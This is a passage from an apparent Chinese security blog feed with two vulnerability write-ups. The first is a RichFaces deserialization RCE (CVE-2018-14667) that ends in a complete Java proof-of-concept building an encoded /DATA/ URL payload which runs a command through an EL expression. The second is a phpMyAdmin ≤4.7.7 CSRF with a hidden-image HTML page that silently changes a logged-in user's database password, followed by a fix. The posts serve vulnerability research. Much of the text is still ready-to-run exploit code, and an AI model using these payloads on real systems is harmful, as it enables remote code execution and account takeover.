alt=""></p><p>将会把<code>URL</code>打印到页面上。</p><p>现在我们看一下<code>getUri</code>的处理过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430343712076.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430343808321.jpg" alt=""></p><p>调用到了<code>UserResource$getDataToStore</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15430346212562.jpg" alt=""></p><p>可以看到主要完成的工作就是将<code>MediaOutputRenderer</code>的<code>component</code>参数（从代码中可以看出是从标签字段中获得的值）中的一些值提取出来赋值到<code>UriData</code>对象中，最后返回<code>UriData</code>对象。</p><p>继续跟进一下<code>getUri</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432033687052.jpg" alt=""></p><p>可以看到<code>storeData</code>就是<code>UriData</code>对象，将其序列化后经过encrypt加密后返回到<code>resourceURL</code>中。回看一下反序列化过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432049639534.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432050454317.jpg" alt=""></p><p>也就是我们只需要构造<code>/DATA/</code>后的数据就好，<code>/DATA/</code>前半段的数据是可以从<code>url</code>中获取的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15432053292392.jpg" alt=""></p><p>至此整个RCE的流程就分析完了。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>梳理整理整个的触发流程，发现该漏洞可执行<code>getLastModified</code>、<code>getExpired</code>、<code>send</code>这三个方法，完成EL表达式的执行，但是他们的触发条件是不同的：</p><ul><li><code>resource.isCacheable</code>为<code>true</code>触发<code>getLastModified</code>、<code>getExpired</code></li><li><code>resource.isCacheable</code>为<code>false</code>触发<code>getLastModified</code>、<code>send</code></li></ul><p>这里解释一下为什么在<code>resource.isCacheable</code>为<code>false</code>时还会触发<code>getLastModified</code>，调用栈如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InternetResourceService$serviceResource:152 # 进入else处理环节</span><br><span class="line">  ResourceLifecycle$send:37 # 无论如何都会调用sendResource方法</span><br><span class="line">  ResourceLifecycle$send:117 # resource.sendHeaders触发getLastModified方法，send触发send方法。</span><br></pre></td></tr></table></figure><p>可以看到最稳定的触发点就是<code>getLastModified</code>，接下来的poc也以这个稳定触发点为例。根据在0x01中已经提及的流程，逆向的生成<code>UriData</code>，序列化，加密，即可。</p><h2 id="3-1-选择反射生成的对象"><a href="#3-1-选择反射生成的对象" class="headerlink" title="3.1 选择反射生成的对象"></a>3.1 选择反射生成的对象</h2><p>根据<a href="https://tint0.com/when-el-injection-meets-java-deserialization/" target="_blank" rel="noopener">tint0</a>的文章，选择使用<code>javax.faces.component.StateHolderSaver</code>来作为反射生成的对象，也就是<code>modified</code>对象，使用这个对象的原因是因为这个对象在反序列化失败时可以返回一个<code>null</code>对象，最后应用会返回一个200状态码，而当反序列化成功时，就尝试将状态对象转换成一个数组，如果失败时会抛出一个Richface无法捕捉的异常，应用最后返回一个500状态码。利用状态码的不同，可以判断我们的反序列化过程是否成功执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String pocEL = <span class="string">"#&#123;request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")&#125;"</span>;</span><br><span class="line"><span class="comment">// 根据文章https://www.anquanke.com/post/id/160338</span></span><br><span class="line">Class cls = Class.forName(<span class="string">"javax.faces.component.StateHolderSaver"</span>);</span><br><span class="line">Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);</span><br><span class="line">ct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Location location = <span class="keyword">new</span> Location(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="3-2-生成UriData"><a href="#3-2-生成UriData" class="headerlink" title="3.2 生成UriData"></a>3.2 生成<code>UriData</code></h2><p>主要点在于构造<code>UriData</code>中的<code>modified</code>字段。首先整理生成<code>modified</code>所需要的几个条件：</p><ol><li>Date类的对象</li><li>生成该对象时需要调用一个<code>ValueExpression</code>类的<code>getValue</code></li></ol><p>跟一下<code>getValue</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434769432673.jpg" alt=""></p><p>根据继承类来看，右边框内的类都是我们可以利用的，以<code>TagValueExpression</code>举例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434770897435.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434771445410.jpg" alt=""></p><p>可以看到需要另外一个<code>ValueExpression</code>类，并且调用其<code>getValue</code>的方法。</p><p>我们首先看该构造函数的第一个需要构造的参数<code>attr</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434773457520.jpg" alt=""></p><p>该类的构造函数为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434773747344.jpg" alt=""></p><p>可以看到关键点在于将我们的EL表达式构造到<code>value</code>处，其他的参数可以为空。</p><p>接着看第二个需要构造的参数<code>orig</code>，这里我们调用另一个<code>ValueExpressionImpl</code>类来构造这个<code>orig</code>参数：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434775915179.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434776020023.jpg" alt=""></p><p>跟一下<code>getNode</code>和<code>getValue</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434780150816.jpg" alt=""></p><p>下个断动态调一下，发现应如此构造<code>expr</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pocEL+&quot; modified&quot;</span><br></pre></td></tr></table></figure><p>其他的参数可以为空。这样我们就可以构造一个完整的<code>TagValueExpression</code>类，这个类可以执行我们的EL表达式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 设置UriData</span></span><br><span class="line"><span class="comment">//    设置UriData.value</span></span><br><span class="line">Object value = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line"><span class="comment">//    设置UriData.createContent</span></span><br><span class="line">Object createContent = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line"><span class="comment">//    设置UriData.expires</span></span><br><span class="line">Object expires = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line"><span class="comment">//    设置UriData.modified</span></span><br><span class="line">TagAttribute tag = <span class="keyword">new</span> TagAttribute(location, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"poc"</span>, <span class="string">"modified="</span>+pocEL);</span><br><span class="line">ValueExpressionImpl valueExpression = <span class="keyword">new</span> ValueExpressionImpl(pocEL+<span class="string">" modified"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, Date.class);</span><br><span class="line">TagValueExpression tagValueExpression = <span class="keyword">new</span> TagValueExpression(tag, valueExpression);</span><br><span class="line">Object modified = ct.newInstance(<span class="keyword">null</span>, tagValueExpression);</span><br></pre></td></tr></table></figure><h2 id="3-3-序列化"><a href="#3-3-序列化" class="headerlink" title="3.3 序列化"></a>3.3 序列化</h2><p>之后的步骤就是利用反射构造一个<code>UriData</code>，并进行初始化，同时执行序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">UserResource.UriData uriData = <span class="keyword">new</span> UserResource.UriData();</span><br><span class="line"></span><br><span class="line">Field valueField = uriData.getClass().getDeclaredField(<span class="string">"value"</span>);</span><br><span class="line">valueField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valueField.set(uriData, value);</span><br><span class="line"></span><br><span class="line">Field createContentField = uriData.getClass().getDeclaredField(<span class="string">"createContent"</span>);</span><br><span class="line">createContentField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">createContentField.set(uriData, createContent);</span><br><span class="line"></span><br><span class="line">Field expiresField = uriData.getClass().getDeclaredField(<span class="string">"expires"</span>);</span><br><span class="line">expiresField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">expiresField.set(uriData, expires);</span><br><span class="line"></span><br><span class="line">Field modifiedField = uriData.getClass().getDeclaredField(<span class="string">"modified"</span>);</span><br><span class="line">modifiedField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiedField.set(uriData, modified);</span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(uriData);</span><br><span class="line">objectOutputStream.flush();</span><br><span class="line">objectOutputStream.close();</span><br><span class="line">byteArrayOutputStream.close();</span><br></pre></td></tr></table></figure><h2 id="3-4-加密"><a href="#3-4-加密" class="headerlink" title="3.4 加密"></a>3.4 加密</h2><p>可以直接复制<code>ResourceBuilderImpl$encrypt</code>的加密函数，就在<code>decrypt</code>的上面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();</span><br><span class="line">Deflater compressor = <span class="keyword">new</span> Deflater(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">byte</span>[] compressed = <span class="keyword">new</span> <span class="keyword">byte</span>[pocData.length + <span class="number">100</span>];</span><br><span class="line">compressor.setInput(pocData);</span><br><span class="line">compressor.finish();</span><br><span class="line"><span class="keyword">int</span> totalOut = compressor.deflate(compressed);</span><br><span class="line"><span class="keyword">byte</span>[] zipsrc = <span class="keyword">new</span> <span class="keyword">byte</span>[totalOut];</span><br><span class="line">System.arraycopy(compressed, <span class="number">0</span>, zipsrc, <span class="number">0</span>, totalOut);</span><br><span class="line">compressor.end();</span><br><span class="line"><span class="keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);</span><br></pre></td></tr></table></figure><p>这里要注意一下顺序，在反序列化前，解密的顺序为base64+zip，那么加密过程就需要zip+base64。</p><h2 id="完整版POC"><a href="#完整版POC" class="headerlink" title="完整版POC"></a>完整版POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.facelets.el.TagValueExpression;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.TagAttribute;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.Location;</span><br><span class="line"><span class="keyword">import</span> org.ajax4jsf.util.base64.URL64Codec;</span><br><span class="line"><span class="keyword">import</span> org.jboss.el.ValueExpressionImpl;</span><br><span class="line"><span class="keyword">import</span> org.ajax4jsf.resource.UserResource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.faces.context.FacesContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String pocEL = <span class="string">"#&#123;request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")&#125;"</span>;</span><br><span class="line">        <span class="comment">// 根据文章https://www.anquanke.com/post/id/160338</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">"javax.faces.component.StateHolderSaver"</span>);</span><br><span class="line">        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);</span><br><span class="line">        ct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Location location = <span class="keyword">new</span> Location(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 设置UriData</span></span><br><span class="line">        <span class="comment">//    设置UriData.value</span></span><br><span class="line">        Object value = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line">        <span class="comment">//    设置UriData.createContent</span></span><br><span class="line">        Object createContent = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line">        <span class="comment">//    设置UriData.expires</span></span><br><span class="line">        Object expires = <span class="string">"cve-2018-14667"</span>;</span><br><span class="line">        <span class="comment">//    设置UriData.modified</span></span><br><span class="line">        TagAttribute tag = <span class="keyword">new</span> TagAttribute(location, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"poc"</span>, <span class="string">"modified="</span>+pocEL);</span><br><span class="line">        ValueExpressionImpl valueExpression = <span class="keyword">new</span> ValueExpressionImpl(pocEL+<span class="string">" modified"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, Date.class);</span><br><span class="line">        TagValueExpression tagValueExpression = <span class="keyword">new</span> TagValueExpression(tag, valueExpression);</span><br><span class="line">        Object modified = ct.newInstance(<span class="keyword">null</span>, tagValueExpression);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 序列化</span></span><br><span class="line">        UserResource.UriData uriData = <span class="keyword">new</span> UserResource.UriData();</span><br><span class="line"></span><br><span class="line">        Field valueField = uriData.getClass().getDeclaredField(<span class="string">"value"</span>);</span><br><span class="line">        valueField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valueField.set(uriData, value);</span><br><span class="line"></span><br><span class="line">        Field createContentField = uriData.getClass().getDeclaredField(<span class="string">"createContent"</span>);</span><br><span class="line">        createContentField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        createContentField.set(uriData, createContent);</span><br><span class="line"></span><br><span class="line">        Field expiresField = uriData.getClass().getDeclaredField(<span class="string">"expires"</span>);</span><br><span class="line">        expiresField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        expiresField.set(uriData, expires);</span><br><span class="line"></span><br><span class="line">        Field modifiedField = uriData.getClass().getDeclaredField(<span class="string">"modified"</span>);</span><br><span class="line">        modifiedField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        modifiedField.set(uriData, modified);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(uriData);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 加密（zip+base64）</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();</span><br><span class="line">        Deflater compressor = <span class="keyword">new</span> Deflater(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] compressed = <span class="keyword">new</span> <span class="keyword">byte</span>[pocData.length + <span class="number">100</span>];</span><br><span class="line">        compressor.setInput(pocData);</span><br><span class="line">        compressor.finish();</span><br><span class="line">        <span class="keyword">int</span> totalOut = compressor.deflate(compressed);</span><br><span class="line">        <span class="keyword">byte</span>[] zipsrc = <span class="keyword">new</span> <span class="keyword">byte</span>[totalOut];</span><br><span class="line">        System.arraycopy(compressed, <span class="number">0</span>, zipsrc, <span class="number">0</span>, totalOut);</span><br><span class="line">        compressor.end();</span><br><span class="line">        <span class="keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 打印最后的poc</span></span><br><span class="line">        String poc = <span class="string">"/DATA/"</span> + <span class="keyword">new</span> String(dataArray, <span class="string">"ISO-8859-1"</span>) + <span class="string">".jsf"</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434804781184.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://tint0.com/when-el-injection-meets-java-deserialization/" target="_blank" rel="noopener">https://tint0.com/when-el-injection-meets-java-deserialization/</a></li><li><a href="https://xz.aliyun.com/t/3264" target="_blank" rel="noopener">https://xz.aliyun.com/t/3264</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚开始分析Java的漏洞，很多东西感觉还是有待学习…&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="RichFaces" scheme="https://lucifaer.com/tags/RichFaces/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin &lt;= 4.7.7 CSRF分析</title>
    <link href="https://lucifaer.com/2018/08/30/phpMyAdmin%20%3C=%204.7.7%20CSRF%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/08/30/phpMyAdmin &lt;= 4.7.7 CSRF分析/</id>
    <published>2018-08-30T12:01:00.000Z</published>
    <updated>2018-08-30T12:01:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>同样也是一个鸡肋漏洞，产生原因在<code>Common.inc.php</code>核心类，感觉漏洞发现者是捡了一个漏洞…</p><a id="more"></a><h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>本周在Twitter上有一个较为热点的讨论话题，是有关phpMyAdmin &lt;=4.7.7版本的一个CSRF漏洞，漏洞存在于<code>common.inc.php</code>中，而笔者分析完后，发现这个更像是漏洞作者捡漏的一个漏洞。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>phpMyAdmin &lt;= 4.7.7</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>本文用phpMyAdmin 4.7.6进行分析。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>直接看漏洞本质，主要在于两个点：</p><p>首先是位于<code>libraries/common.inc.php</code>中第375行到389行这一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PMA_isValid($_POST[<span class="string">'token'</span>])) &#123;</span><br><span class="line">        $token_provided = <span class="keyword">true</span>;</span><br><span class="line">        $token_mismatch = ! @hash_equals($_SESSION[<span class="string">' PMA_token '</span>], $_POST[<span class="string">'token'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($token_mismatch) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * We don't allow any POST operation parameters if the token is mismatched</span></span><br><span class="line"><span class="comment">         * or is not provided</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $whitelist = <span class="keyword">array</span>(<span class="string">'ajax_request'</span>);</span><br><span class="line">        PMA\libraries\Sanitize::removeRequestVars($whitelist);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个关键点：如果发送的请求是<code>GET</code>请求，就可以绕过对于参数的检测。</p><p>其次，第二个漏洞触发的关键点在<code>sql.php</code>第72行到76行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这边可以直接接受外部<code>GET</code>请求的参数，在190行到199行处直接执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($goto == <span class="string">'sql.php'</span>) &#123;</span><br><span class="line">    $is_gotofile = <span class="keyword">false</span>;</span><br><span class="line">    $goto = <span class="string">'sql.php'</span> . URL::getCommon(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'db'</span> =&gt; $db,</span><br><span class="line">            <span class="string">'table'</span> =&gt; $table,</span><br><span class="line">            <span class="string">'sql_query'</span> =&gt; $sql_query</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>如上所说，我们只需要构造一个页面该页面在用户点击的时候自动发一个<code>GET</code>请求就ok了。</p><p>我在漏洞利用这边举一个利用csrf修改当前用户密码的例子。</p><p>构造一个HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>POC TEST<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://localhost:8888/sql.php?db=mysql&amp;table=user&amp;sql_query=SET password = PASSWORD('vul_test')"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后诱导已经登录phpMyAdmin的用户访问，当前用户的密码就已经改为<code>vul_test</code>了。</p><h1 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h1><p>最简单的修补方式就是将<code>sql.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，直接更新到最新版是更好的方法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;同样也是一个鸡肋漏洞，产生原因在&lt;code&gt;Common.inc.php&lt;/code&gt;核心类，感觉漏洞发现者是捡了一个漏洞…&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
